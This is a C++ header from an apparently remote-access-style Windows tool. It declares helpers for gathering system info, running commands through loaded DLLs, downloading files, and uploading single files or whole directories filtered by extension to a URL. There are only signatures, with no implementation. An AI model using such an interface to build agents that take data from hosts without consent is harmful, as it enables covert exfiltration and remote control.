// Copyright (c) Nouman Tajik [github.com/tajiknomi]
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE. 


#pragma once

#include "utilities.h"
#include <string>
#include <vector>
#include <filesystem>
#include <Windows.h>

namespace fs = std::filesystem;

//std::string xorEncryptDecrypt(const std::string& data, const std::string& key);

bool isValidPort(const std::string &portNum);

std::wstring changeDir(const std::wstring& newPath, std::error_code& ec);

std::wstring getExecutableDir(void);

bool writeFileContents(const std::string& filename, const std::string& fileContent);

std::wstring extractFilename(const std::wstring& filePath);

std::wstring ExtractLastDirectoryName(const std::wstring& path);

bool isExecutable(const std::wstring& path);

//std::size_t calculateDirectorySize(const std::wstring& path);		// Take too much time, NOT EFFECIENT for now

std::string generateRandomAlphanumeric(const int &length, const long long &seed);

std::string extractBase64Data(const std::wstring& buff);

std::wstring getSysInfoInJson();

std::wstring ReplaceTildeWithPathWindows(const std::wstring& filePath);

bool IscmdletAvailable(const std::wstring &cmdlet);

std::wstring findCompressionUtility(std::wstring &outputCompressionUtilityPath);



// network
bool DownloadFileFromURLViaDll(const HMODULE &hCurlLib, const std::wstring& url, const std::wstring& destDirPath, std::wstring& errorMsg);
bool UploadFileToURLViaDll(const HMODULE &hCurlLib, const std::wstring& url, const std::wstring& filePath, std::wstring& errorMsg);
bool UploadDirectoryToURLViaDll(const HMODULE &hCurlLib, const std::wstring& url, const std::wstring& dirPath, std::wstring& errorMsg, const std::wstring& extensions = L"");

// Function invoke via DLLs
std::wstring filemanagerViaDll(const HMODULE &hFilemanagerLib, const std::wstring &dirToList);
std::wstring executeCommandViaDll(const HMODULE &hExecLib, const std::wstring& command, const std::wstring& args);
